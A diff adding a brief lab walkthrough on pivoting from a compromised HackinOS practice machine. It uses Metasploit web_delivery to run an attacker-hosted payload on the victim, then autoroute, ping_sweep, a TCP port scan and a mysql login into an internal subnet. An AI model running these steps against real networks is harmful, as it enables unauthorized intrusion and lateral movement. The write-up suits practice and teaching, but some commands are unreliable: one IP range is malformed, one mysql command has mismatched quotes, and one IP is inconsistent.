@@ -1,0 +1,64 @@
+Pivoting
+
+Machine to practice on - HackinOS
+
+Machine IP - 192.168.43.232
+
+First, I gain access to the machine, using a netcat listener
+
+Now,i check the IP Address,using 'ifconfig'
+The address of the machine - 172.18.0.3
+
+We then power up msfconsole and run the exploit/multi/script/web_delivery
+
+set LHOST 192.168.43.205
+set LPORT 1234
+exploit                          - Image P1
+
+We get a python code to run. We copy-paste and run it on the victim machine.       - Image P2
+
+Glancing back, we get a shell on meterpreter
+Running 'ifconfig',we get that IP = 172.18.0.3  -Image P3
+
+(We observe 2 networks - one is localhost and another is the host's network subnet (172.18.0.0/24)
+
+Our objective - Since we gained a shell on the victim machine, as well as a meterpreter shell, now,let's run the autoroute exploit to break into this subnet
+
+Now 'background' this session - background
+Now,we need to take the /post/multi/manage/autoroute
+set session 1   <-Session in the background,will be used to pivot into this subnet network
+
+exploit 
+
+The subnet will be added to the routing table automatically
+
+Now, we use  post/multi/gather/ping_sweep,to sweep the subnet for hosts
+set RHOSTS 172.18.0.0.-255  - We scan the entire list of hosts 
+set session 1
+exploit
+
+Will get the list of active and alive hosts
+
+Now,we need to scan ports, so we use auxiliary/scanner/portscan/tcp
+
+set RHOSTS <IP>  Either xxx.xx.xx.0-last octet or scan each IP Address individually
+
+set threads 10
+exploit
+
+We get the open ports, find the port that interests you.
+
+Now, just background if possible and type 'shell' into the meterpreter prompt
+
+or
+
+From your root prompt in the rooted machine, target the service on the hosts that you found
+
+If you want to access port 3306 on IP=172.18.0.3,
+
+mysql -u "username" -h 172.18.0.3 -p "password'
+
+or
+
+
+mysql -u "username" -h 172.18.0.3 -p 
